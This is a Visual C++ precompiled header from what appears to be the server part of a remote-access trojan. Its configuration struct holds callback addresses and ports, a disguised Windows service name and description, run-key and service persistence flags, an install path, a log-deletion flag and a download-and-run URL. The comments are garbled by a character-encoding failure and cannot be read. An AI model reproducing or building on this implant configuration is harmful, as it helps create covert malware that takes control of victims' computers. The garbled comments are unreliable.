// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__02BAC0DC_8949_4F56_A229_4DDAABB1F28A__INCLUDED_)
#define AFX_STDAFX_H__02BAC0DC_8949_4F56_A229_4DDAABB1F28A__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

// Insert your headers here
#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers

#ifdef _DEBUG
//#include <vld.h>
#endif // _DEBUG

#define _WIN32_WINNT 0x0501
#include <afxtempl.h>
#include <windows.h>
#include <map>
#include "sal.h"

//������Ϣ�ṹ��
struct MODIFY_DATA
{
	TCHAR szDns1[300];      //���ߵ�ַ1
	TCHAR szDns2[300];      //���ߵ�ַ2
	DWORD dwPort1;          //���߶˿�1
	DWORD dwPort2;          //���߶˿�2
	TCHAR szGroup[50];      //���߷���
	TCHAR szVersion[32];    //���߰汾
	TCHAR SerName[100];     //��������
	TCHAR Serdisplay[128];  //��ʾ����
	TCHAR Serdesc[256];     //��������
	TCHAR szGetGroup[256];  //����Ψһ��ʶ
	BOOL  bLanPenetrate;    //�Ƿ�ʹ����������͸
	BOOL  bService;         //�Ƿ��Ƿ�������
	BOOL  bRuns;            //�Ƿ�������Ŀ¼����
	BOOL  bRunOnce;         //�Ƿ�Ϊ��ɫ��װ
	TCHAR ReleasePath[100]; //��װ;��
	TCHAR ReleaseName[50];  //��װ����
	WORD  Dele_zd;          //��װ����
	WORD  FileAttribute;    //�ļ�����
	BOOL Dele_Kzj;          //���߼�¼
	TCHAR szDownRun[512];   //�������е�ַ
};
// TODO: reference additional headers your program requires here
extern WORD    InstallMode;    // ����ģʽ
extern UINT    ConnectType;    // ��������
extern LPCTSTR lpConnInfos[2]; // ��������
extern DWORD   dwConnPorts[2]; // ���߶˿�
extern LPTSTR  lpszUserSid;    // ��ʺ�
extern char*   lpDriverName;   // ��������
extern char *scEXEName; //����Ĳ���

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__02BAC0DC_8949_4F56_A229_4DDAABB1F28A__INCLUDED_)
